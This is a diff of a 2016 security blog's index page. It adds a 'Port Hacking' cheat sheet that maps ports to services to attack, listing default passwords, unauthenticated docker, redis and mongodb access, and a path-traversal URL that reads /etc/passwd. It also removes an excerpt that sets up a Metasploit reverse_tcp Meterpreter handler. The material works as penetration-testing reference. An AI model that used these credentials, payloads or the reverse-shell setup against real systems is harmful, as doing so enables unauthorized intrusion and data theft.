@@ -263,6 +263,123 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/05/15/Port-Hacking/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/15/Port-Hacking/" itemprop="url">
+                  Port Hacking
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-05-15T22:59:16+08:00">
+                2016-05-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Port    information</span><br><span class="line">21      ftp  主要看是否支持匿名，也可以跑弱口令</span><br><span class="line">22      ssh</span><br><span class="line">23      telnet</span><br><span class="line">79      Finger</span><br><span class="line">80      web  常见web漏洞以及是否为一些管理后台</span><br><span class="line">111     rpcinfo</span><br><span class="line">161     snmp</span><br><span class="line">389     LDAP</span><br><span class="line">443     openssl  心脏滴血以及一些web漏洞测试</span><br><span class="line">445     SMB</span><br><span class="line">512     Rexec</span><br><span class="line">513     Rexec</span><br><span class="line">514     Rexec</span><br><span class="line">873     rsync  未授权，主要看是否支持匿名，也可以跑弱口令</span><br><span class="line">1025    nfs</span><br><span class="line">1099    rmi协议</span><br><span class="line">1433    mssql</span><br><span class="line">1521    oracle</span><br><span class="line">1900    bes默认管理后台</span><br><span class="line">2082    cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2083    cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2100    Oracle XDB FTP服务</span><br><span class="line">2181    zookeeper 未配置权限</span><br><span class="line">2182    zookeeper 未配置权限</span><br><span class="line">2222    DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2375    docker  未授权访问,Web页面访问http://host:2375/containers/json   &gt;docker -H tcp://host:2375 ps</span><br><span class="line">2601    zebra路由，默认密码zebra</span><br><span class="line">2604    zebra路由，默认密码zebra</span><br><span class="line">3000    Webrick(Ruby Webserver)</span><br><span class="line">3128    squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><span class="line">3306    mysql</span><br><span class="line">3311    kangle主机管理系统登陆 初始用户密码admin/kangle</span><br><span class="line">3312    kangle主机管理系统登陆</span><br><span class="line">3690    svn http://wooyun.org/bugs/wooyun-2015-0141925</span><br><span class="line">3389    mstsc远程桌面</span><br><span class="line">4440    rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网</span><br><span class="line">4848    GlassFish web中间件 弱口令:admin/adminadmin</span><br><span class="line">5432    postgresql</span><br><span class="line">5900    VNC</span><br><span class="line">5984    CouchDB数据库未授权访问漏洞 http://host:5984/_utils/</span><br><span class="line">6082    varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><span class="line">6379    redis 一般无认证，可直接访问</span><br><span class="line">6082    varnish</span><br><span class="line">7001    Weblogic</span><br><span class="line">7002    Weblogic</span><br><span class="line">7474    Neo4j</span><br><span class="line">7778    Kloxo主机控制面板登录 </span><br><span class="line">8000-9090  Web端口</span><br><span class="line">8000    海康威视    admin/12345</span><br><span class="line">8089    jboss端口 历史曾经爆漏洞/可弱口令</span><br><span class="line">8098    Riak8080    tomcat</span><br><span class="line">8080    tomcat默认tomcat/tomcat WDCP主机管理系统admin/wdlinux.cn root/wdlinux.cn</span><br><span class="line">8083    Vestacp主机管理系统 （国外用较多</span><br><span class="line">8888    amh/LuManager 主机管理系统默认端口</span><br><span class="line">8983    solr</span><br><span class="line">9000    Hbase</span><br><span class="line">9000    fcgi fcig php执行 资料:http://zone.wooyun.org/content/1060</span><br><span class="line">9043    websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager</span><br><span class="line">9080    WebSphere应用程序</span><br><span class="line">9090    WebSphere管理工具</span><br><span class="line">9090    多个厂商上网行为管理设备命令执行及getshell http://wooyun.org/bugs/wooyun-2016-0192732</span><br><span class="line">9200    elasticsearch   remote code execution</span><br><span class="line">9300    elasticsearch   remote code execution</span><br><span class="line">10000   Virtualmin/Webmin 服务器虚拟主机管理系统</span><br><span class="line">10068   :10068/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd    http://www.wooyun.org/bugs/wooyun-2015-098504</span><br><span class="line">11211   memcache 未授权访问</span><br><span class="line">27017   mongodb 未授权访问</span><br><span class="line">28017   mongodb统计页面</span><br><span class="line">20880   dubbo未授权访问</span><br><span class="line">50000   SAP命令执行</span><br><span class="line">50060   hadoop web案例:WooYun: 爱拍某处产品日志泄漏</span><br><span class="line">50070   hadoop默认端口未授权访问</span><br><span class="line">53413   Netcore(Netis)路由器UDP后门 msf&gt; exploits/linux/misc/netcore_udp_53413_backdoor</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1355,127 +1472,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/04/19/meterpreter/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/04/19/meterpreter/" itemprop="url">
-                  meterpreter
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-04-19T02:24:02+08:00">
-                2016-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf payload(reverse_tcp) &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.100.10</span><br><span class="line">LHOST =&gt; 192.168.100.10</span><br><span class="line">msf exploit(handler) &gt; set LPORT 9876</span><br><span class="line">LPORT =&gt; 9876</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.100.10     yes       The listen address</span><br><span class="line">   LPORT     9876             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/04/19/meterpreter/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1521,7 +1517,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">83</span>
+              <span class="site-state-item-count">84</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1531,7 +1527,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">64</span>
+                <span class="site-state-item-count">65</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
